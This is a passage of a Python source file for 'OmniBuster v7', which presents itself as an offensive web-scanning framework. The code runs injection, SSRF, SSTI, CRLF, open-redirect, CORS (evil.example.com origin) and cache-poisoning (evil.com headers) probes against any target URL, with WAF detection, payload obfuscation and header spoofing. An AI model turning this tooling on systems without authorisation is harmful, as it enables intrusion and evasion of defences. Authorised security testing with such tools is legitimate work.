                                       allow_redirects=False)
            if not res: continue
            if res.status in (301, 302, 307, 308) and res.redirect and "evil.com" in res.redirect:
                reporter.report_finding("Open-Redirect",
                    f"param={param} payload={payload!r} -> {res.redirect}", "medium", res.url)
                return
    with tqdm(total=len(params), desc="OpenRedirect", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_ssti(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        for payload in PayloadFactory.ssti():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            for sig in PayloadFactory.SSTI_SIGNATURES:
                if re.search(sig, body):
                    reporter.report_finding("SSTI",
                        f"param={param} payload={payload!r}", "critical", res.url)
                    return
    with tqdm(total=len(params), desc="SSTI", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_cmdi(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        normal = await client.request("GET", build_url_with_param(base_url, param, "test"), read_body=True)
        if not normal: return
        t0 = time.monotonic()
        await client.request("GET", build_url_with_param(base_url, param, "test"), read_body=True)
        nt = time.monotonic() - t0
        for payload in PayloadFactory.cmdi():
            t0 = time.monotonic()
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            elapsed = time.monotonic() - t0
            if not res: continue
            body = res.extra.get("body", "")
            for sig in PayloadFactory.CMDI_SIGNATURES:
                if re.search(sig, body, re.IGNORECASE):
                    reporter.report_finding("Command-Injection",
                        f"param={param} payload={payload!r}", "critical", res.url)
                    return
            if "sleep" in payload and elapsed > nt + 2.5:
                reporter.report_finding("Command-Injection-Time",
                    f"param={param} payload={payload!r} -> {elapsed:.2f}s", "high", res.url)
                return
    with tqdm(total=len(params), desc="CMDi", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_crlf(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
        for payload in PayloadFactory.crlf():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            headers = res.extra.get("headers", {})
            if "Injected-Header" in headers:
                reporter.report_finding("CRLF-Injection",
                    f"param={param} payload={payload!r}", "high", res.url)
                return
    with tqdm(total=len(params), desc="CRLF", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_vulns(client, config, reporter, params):
    print(f"\n{C_BOLD}=== Tests de vulnérabilités ==={C_END}")
    print(f"Paramètres : {', '.join(params)}")
    print(f"Obfuscation: {config.obfuscation}\n")
    await asyncio.gather(
        scan_sqli(client, config, reporter, params),
        scan_xss(client, config, reporter, params),
        scan_lfi(client, config, reporter, params),
        scan_ssrf(client, config, reporter, params),
        scan_open_redirect(client, config, reporter, params),
        scan_ssti(client, config, reporter, params),
        scan_cmdi(client, config, reporter, params),
        scan_crlf(client, config, reporter, params),
    )

# ===========================================================================
# SECTION 14 : FICHIERS SENSIBLES
# ===========================================================================

async def scan_sensitive_files(client, config, reporter):
    print(f"\n{C_BOLD}=== Détection fichiers sensibles ==={C_END}")
    base = config.target.rstrip("/")
    async def worker(path):
        url = f"{base}/{path}"
        res = await client.request("GET", url, read_body=True, allow_redirects=False)
        if not res or res.status != 200 or res.size == 0: return
        body_low = res.extra.get("body", "").lower()[:200]
        if "not found" in body_low or "404" in body_low: return
        reporter.report_finding("Sensitive-File", f"{path} ({res.size}b)", "high", url)
    with tqdm(total=len(PayloadFactory.SENSITIVE_PATHS), desc="Files", unit="path") as pbar:
        for coro in asyncio.as_completed([worker(p) for p in PayloadFactory.SENSITIVE_PATHS]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 15 : SECURITY HEADERS / COOKIES / CORS / VERBS
# ===========================================================================

async def scan_security_headers(client, config, reporter):
    print(f"\n{C_BOLD}=== Analyse en-têtes ==={C_END}")
    res = await client.request("GET", config.target, read_body=True, allow_redirects=True)
    if not res: return
    headers = res.extra.get("headers", {})
    for h, sev in SECURITY_HEADERS.items():
        if h not in headers:
            reporter.report_finding("Missing-Header", f"{h} absent ({sev})", sev, config.target)
    for h in ("Server", "X-Powered-By", "X-AspNet-Version", "X-Generator"):
        if h in headers:
            reporter.report_finding("Info-Disclosure", f"{h}: {headers[h]}", "low", config.target)

async def scan_cookies(client, config, reporter):
    print(f"\n{C_BOLD}=== Analyse cookies ==={C_END}")
    res = await client.request("GET", config.target, read_body=True, allow_redirects=True)
    if not res: return
    set_cookie = res.extra.get("headers", {}).get("Set-Cookie", "")
    if not set_cookie:
        print(f"{C_YELLOW}[*] Aucun cookie.{C_END}")
        return
    for flag in PayloadFactory.COOKIE_SECURE_FLAGS:
        if flag.lower() not in set_cookie.lower():
            reporter.report_finding("Cookie-Weak", f"Flag '{flag}' manquant", "low", config.target)

async def scan_cors(client, config, reporter):
    print(f"\n{C_BOLD}=== Test CORS ==={C_END}")
    evil = "https://evil.example.com"
    res = await client.request("GET", config.target, headers={"Origin": evil},
                               read_body=True, allow_redirects=False)
    if not res: return
    headers = res.extra.get("headers", {})
    acao = headers.get("Access-Control-Allow-Origin", "")
    acac = headers.get("Access-Control-Allow-Credentials", "")
    if acao == evil:
        sev = "critical" if acac.lower() == "true" else "high"
        reporter.report_finding("CORS-Misconfig",
            f"ACAO reflects Origin, Credentials={acac}", sev, config.target)

async def scan_verbs(client, config, reporter):
    print(f"\n{C_BOLD}=== HTTP Verb Tampering ==={C_END}")
    async def worker(verb):
        res = await client.request(verb, config.target, read_body=True, allow_redirects=False)
        if not res: return
        if res.status in (200, 204) and verb not in ("GET", "POST", "HEAD"):
            reporter.report_finding("Verb-Allowed", f"{verb} -> {res.status}", "medium", config.target)
    with tqdm(total=len(PayloadFactory.HTTP_VERBS), desc="Verbs", unit="verb") as pbar:
        for coro in asyncio.as_completed([worker(v) for v in PayloadFactory.HTTP_VERBS]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 16 : CACHE POISONING
# ===========================================================================

CACHE_POISON_HEADERS = [
    ("X-Forwarded-Host", "evil.com"),
    ("X-Forwarded-Scheme", "http"),
    ("X-Forwarded-Proto", "http"),
    ("X-Host", "evil.com"),
    ("X-Original-URL", "/poisoned_path"),
    ("X-Rewrite-URL", "/poisoned_path"),
    ("X-Forwarded-Prefix", "/poisoned"),
    ("X-HTTP-Method-Override", "POST"),
]

async def scan_cache_poisoning(client, config, reporter):
    print(f"\n{C_BOLD}=== Cache Poisoning ==={C_END}")
    marker = "omni_" + "".join(random.choices(string.ascii_lowercase, k=8))
    for header, value in CACHE_POISON_HEADERS:
        poisoned = value + "." + marker + ".com"
        res = await client.request("GET", config.target, headers={header: poisoned},
                                   read_body=True, allow_redirects=False)
        if not res: continue
        body = res.extra.get("body", "")
        headers = res.extra.get("headers", {})
        if marker in body or marker in str(headers):
            reporter.report_finding("Cache-Poison-Reflect",
                f"Header {header} reflété", "high", config.target)

# ===========================================================================
# SECTION 17 : JSON FUZZING
# ===========================================================================

async def scan_json_fuzz(client, config, reporter, json_template, fuzz_key):
    print(f"\n{C_BOLD}=== JSON Fuzzing ({fuzz_key}) ==={C_END}")
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    try:
        template = json.loads(json_template) if isinstance(json_template, str) else json_template
    except json.JSONDecodeError:
        print(f"{C_RED}[-] JSON invalide{C_END}")
        return
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    categories = [
        ("SQLi-JSON", PayloadFactory.sqli(count=count, obfuscate=obfuscate), SQLI_ERROR_SIGNATURES),
        ("SSTI-JSON", PayloadFactory.ssti(), PayloadFactory.SSTI_SIGNATURES),
        ("CMDi-JSON", PayloadFactory.cmdi(), PayloadFactory.CMDI_SIGNATURES),
    ]
    for cat_name, payloads, sigs in categories:
        for payload in payloads:
            data = dict(template)
            data[fuzz_key] = payload
            res = await client.request("POST", base_url, json_data=data, read_body=True,
                                       allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            for sig in sigs:
                if re.search(sig, body, re.IGNORECASE):
                    reporter.report_finding(cat_name,
                        f"key={fuzz_key} payload={payload!r}", "high", base_url)
                    break

# ===========================================================================
# SECTION 18 : EXTRACTION PARAMS
# ===========================================================================

async def extract_params(client, config):
    res = await client.request("GET", config.target, read_body=True, allow_redirects=True)
    if not res: return [], []
    body = res.extra.get("body", "")
    get_params, post_params = set(), set()
    for m in re.finditer(r'<form[^>]*>(.*?)</form>', body, re.IGNORECASE | re.DOTALL):
        form_html = m.group(0)
        method_m = re.search(r'method=["\'](\w+)["\']', form_html, re.IGNORECASE)
        method = (method_m.group(1).upper() if method_m else "GET")
        for inp in re.finditer(r'name=["\']([^"\']+)["\']', form_html, re.IGNORECASE):
            n = inp.group(1)
            if method == "POST": post_params.add(n)
            else: get_params.add(n)
    for m in re.finditer(r'href=["\']([^"\']+)["\']', body):
        href = m.group(1)
        if "?" in href:
            for pair in href.split("?", 1)[1].split("&"):
                if "=" in pair: get_params.add(pair.split("=", 1)[0])
    return sorted(get_params), sorted(post_params)

# ===========================================================================
# SECTION 19 : INTÉGRATIONS EXTERNES
# ===========================================================================

def run_nuclei(target, templates=None):
    if not shutil.which("nuclei"):
        print(f"{C_YELLOW}[*] nuclei introuvable.{C_END}")
        return []
    outfile = tempfile.mktemp(suffix=".jsonl")
    cmd = ["nuclei", "-u", target, "-jsonl", "-o", outfile, "-silent", "-no-color"]
    if templates:
        cmd += ["-t", templates]
    print(f"{C_CYAN}[nuclei] {' '.join(cmd)}{C_END}")
    try:
        subprocess.run(cmd, timeout=1800, check=False)
    except subprocess.TimeoutExpired:
        pass
    findings = []
    if os.path.exists(outfile):
        try:
            with open(outfile) as f:
                for line in f:
                    try:
                        data = json.loads(line)
                        findings.append({
                            "name": data.get("info", {}).get("name"),
                            "severity": data.get("info", {}).get("severity", "info"),
                            "matched": data.get("matched-at"),
                        })
                    except json.JSONDecodeError:
                        continue
        finally:
            try: os.remove(outfile)
            except OSError: pass
    return findings

def run_dalfox(url, extra_args=None):
    if not shutil.which("dalfox"):
        print(f"{C_YELLOW}[*] dalfox introuvable.{C_END}")
        return []
    outfile = tempfile.mktemp(suffix=".json")
    cmd = ["dalfox", "url", url, "--format", "json", "--output", outfile,
           "--no-color", "--silence", "--worker", "10"]
    if extra_args:
        cmd += extra_args.split()
    print(f"{C_CYAN}[dalfox] {' '.join(cmd)}{C_END}")
    try:
        subprocess.run(cmd, timeout=900, check=False)
    except subprocess.TimeoutExpired:
        pass
    findings = []
    if os.path.exists(outfile):
        try:
            with open(outfile) as f:
                try:
                    data = json.load(f)
                    if isinstance(data, list):
                        for item in data:
                            findings.append({
                                "url": item.get("url"),
                                "payload": item.get("payload"),
                                "type": item.get("type"),
                            })
                except json.JSONDecodeError:
                    pass
        finally:
            try: os.remove(outfile)
            except OSError: pass
    return findings

# ===========================================================================
# SECTION 20 : DISPATCHER
# ===========================================================================

async def run_single_mode(client, config, reporter, args):
    mode = args.mode
    if mode == "dir":
        if not args.wordlist: return
        wl = load_wordlist(args.wordlist)
        wildcard = await detect_wildcard(client, config.target)
        if wildcard:
            print(f"{C_YELLOW}[!] Wildcard: {wildcard}{C_END}")
        await scan_directory(client, config, reporter, wl, config.target.rstrip("/"), wildcard)
    elif mode == "sub":
        if not args.wordlist: return
        await scan_subdomains(client, config, reporter, load_wordlist(args.wordlist))
    elif mode == "vhost":
        if not args.wordlist: return
        b = await client.request("GET", config.target, read_body=True)
        await scan_vhosts(client, config, reporter, load_wordlist(args.wordlist), b.size if b else 0)
    elif mode == "head":
        if not args.wordlist: return
        b = await client.request("GET", config.target, read_body=True)
        await scan_headers(client, config, reporter, load_wordlist(args.wordlist), b.size if b else 0)
    elif mode == "vuln":
        params = args.params or []
        if args.auto_params:
            gp, _ = await extract_params(client, config)
            params = sorted(set(params + gp))
        if params:
            await scan_vulns(client, config, reporter, params)
    elif mode == "post":
        pass  # non implémenté v7, voir scan_json_fuzz pour analogie
    elif mode == "files":
        await scan_sensitive_files(client, config, reporter)
    elif mode == "sec":
        await scan_security_headers(client, config, reporter)
    elif mode == "cookies":
        await scan_cookies(client, config, reporter)
    elif mode == "cors":
        await scan_cors(client, config, reporter)
    elif mode == "verbs":
        await scan_verbs(client, config, reporter)
    elif mode == "cache":
        await scan_cache_poisoning(client, config, reporter)
    elif mode == "json":
        if args.json_body and args.json_fuzz_key:
            await scan_json_fuzz(client, config, reporter, args.json_body, args.json_fuzz_key)
    elif mode in ("all", "auto"):
        await scan_security_headers(client, config, reporter)
        await scan_cookies(client, config, reporter)
        await scan_cors(client, config, reporter)
        await scan_verbs(client, config, reporter)
        await scan_cache_poisoning(client, config, reporter)
        await scan_sensitive_files(client, config, reporter)
        gp, _ = await extract_params(client, config)
        if gp:
            await scan_vulns(client, config, reporter, gp)

    if config.use_nuclei:
        print(f"\n{C_CYAN}[*] Nuclei...{C_END}")
        for f in run_nuclei(config.target, config.nuclei_templates):
            reporter.report_finding("Nuclei",
                f"[{f.get('severity','info')}] {f.get('name')} -> {f.get('matched')}",
                f.get("severity", "info"), config.target)
    if config.use_dalfox:
        print(f"\n{C_CYAN}[*] Dalfox...{C_END}")
        for f in run_dalfox(config.target, config.dalfox_args):
            reporter.report_finding("Dalfox",
                f"XSS {f.get('type')} payload={f.get('payload')}", "medium", config.target)

# ===========================================================================
# SECTION 21 : SIGNAL & CLI
# ===========================================================================

shutdown_flag = False

def sigint_handler(signum, frame):
    global shutdown_flag
    print(f"\n{C_RED}[!] Interruption...{C_END}")
    shutdown_flag = True

BANNER = rf"""
{C_MAGENTA}{C_BOLD} ______ __  __ _   _ _____ ____  _    _  _____ _______ ______ _____  
|  ____|  \/  | \ | |_   _|  _ \| |  | |/ ____|__   __|  ____|  __ \ 
| |__  | \  / |  \| | | | | |_) | |  | | (___    | |  | |__  | |__) |
|  __| | |\/| | . ` | | | |  _ <| |  | |\___ \   | |  |  __| |  _  / 
| |____| |  | | |\  |_| |_| |_) | |__| |____) |  | |  | |____| | \ \ 
|______|_|  |_|_| \_|_____|____/ \____/|_____/   |_|  |______|_|  \_\ 
{C_END}                                            {C_CYAN}OmniBuster v7{C_END}
"""

def build_parser():
    parser = argparse.ArgumentParser(
        description="OmniBuster v7 - Framework offensif tout-en-un",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Modes : dir, sub, vhost, head, vuln, files, sec, cookies,
  cors, verbs, cache, json, all, auto

Exemples :
  omnibuster dir  -u http://cible -w wordlist.txt -x php,html
  omnibuster vuln -u "http://cible/page?id=1" --params id --obfuscation high
  omnibuster vuln -u http://cible/page --auto-params
  omnibuster json -u http://api/login --json-body '{"u":"a","p":"b"}' --json-fuzz-key p
  omnibuster all  -u http://cible --html-report report.html
""")
    parser.add_argument("mode", choices=[
        "dir", "sub", "vhost", "head", "vuln", "post", "files",
        "sec", "cookies", "cors", "verbs", "cache", "json", "all", "auto"
    ])
    parser.add_argument("-u", "--url")
    parser.add_argument("--targets-file")
    parser.add_argument("-w", "--wordlist")
    parser.add_argument("-t", "--threads", type=int, default=50)
    parser.add_argument("--timeout", type=int, default=5)
    parser.add_argument("--retries", type=int, default=2)
    parser.add_argument("-x", "--extensions", default="")
    parser.add_argument("-mc", "--match-codes", default="200,204,301,302,307,401,403")
    parser.add_argument("-fc", "--filter-codes", default="")
    parser.add_argument("-fs", "--filter-size", type=int)
    parser.add_argument("-fw", "--filter-words", type=int)
    parser.add_argument("-fl", "--filter-lines", type=int)
    parser.add_argument("-fr", "--filter-regex")
    parser.add_argument("--proxy")
    parser.add_argument("--proxy-file")
    parser.add_argument("-r", "--recursion", type=int, default=0)
    parser.add_argument("--rate-limit", type=float, default=0.0)
    parser.add_argument("--random-delay", action="store_true")
    parser.add_argument("--no-spoof-headers", action="store_true")
    parser.add_argument("-o", "--output")
    parser.add_argument("--format", choices=["txt", "json", "csv"], default="txt")
    parser.add_argument("--html-report")
    parser.add_argument("-H", "--header", action="append", default=[])
    parser.add_argument("-C", "--cookie", action="append", default=[])
    parser.add_argument("--params", nargs="+")
    parser.add_argument("--auto-params", action="store_true")
    parser.add_argument("--post-params", nargs="+")
    parser.add_argument("--obfuscation", choices=["low", "medium", "high"], default="medium")
    parser.add_argument("--custom-payload-file")
    parser.add_argument("--use-sqlmap", action="store_true")
    parser.add_argument("--http2", action="store_true")
    parser.add_argument("--use-nuclei", action="store_true")
    parser.add_argument("--nuclei-templates")
    parser.add_argument("--use-dalfox", action="store_true")
    parser.add_argument("--dalfox-args")
    parser.add_argument("--resume", dest="resume_file")
    parser.add_argument("--json-body")
    parser.add_argument("--json-fuzz-key")
    return parser

def build_config(args):
    extra_headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()
    cookies = {}
    for c in args.cookie:
        if "=" in c:
            k, v = c.split("=", 1)
            cookies[k.strip()] = v.strip()
    target = args.url or ""
    if target and not target.startswith("http"):
        target = "http://" + target
    return ScanConfig(
        target=target,
        concurrency=args.threads,
        timeout=args.timeout,
        retries=args.retries,
        match_codes=set(int(c) for c in args.match_codes.split(",") if c.strip()),
        exclude_codes=set(int(c) for c in args.filter_codes.split(",") if c.strip()),
        filter_size=args.filter_size,
        filter_words=args.filter_words,
        filter_lines=args.filter_lines,
        filter_regex=args.filter_regex,
        extensions=[e.strip() for e in args.extensions.split(",") if e.strip()],
        proxy=args.proxy,
        proxy_file=args.proxy_file,
        recursion_depth=args.recursion,
        output_file=args.output,
        output_format=args.format,
        html_report=args.html_report,
        extra_headers=extra_headers,
        cookies=cookies,
        rate_limit=args.rate_limit,
        obfuscation=args.obfuscation,
        random_delay=args.random_delay,
        spoof_headers=not args.no_spoof_headers,
        use_sqlmap=args.use_sqlmap,
        resume_file=args.resume_file,
        targets_file=args.targets_file,
        http2=args.http2,
        use_nuclei=args.use_nuclei,
        nuclei_templates=args.nuclei_templates,
        use_dalfox=args.use_dalfox,
        dalfox_args=args.dalfox_args,
    )

async def run_scan(args):
    config = build_config(args)
    reporter = Reporter(config)

    if not config.target:
        print(f"{C_RED}[-] -u ou --targets-file requis{C_END}")
        sys.exit(1)

    async with HTTPClient(config) as client:
        print(f"{C_YELLOW}[*] Détection WAF...{C_END}")
        wafs = await detect_waf(client, config.target)
        if wafs:
            print(f"{C_RED}[!] WAF: {', '.join(wafs)}{C_END}")
        else:
            print(f"{C_GREEN}[+] Aucun WAF évident.{C_END}")

        await run_single_mode(client, config, reporter, args)

    reporter.summary()

def main():
    signal.signal(signal.SIGINT, sigint_handler)
    print(BANNER)
    parser = build_parser()
    args = parser.parse_args()

    if not args.url and not args.targets_file:
        print(f"{C_RED}[-] -u ou --targets-file requis{C_END}")
        sys.exit(1)

    try:
        asyncio.run(run_scan(args))
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Interrompu{C_END}")
        sys.exit(0)

if __name__ == "__main__":
    main()
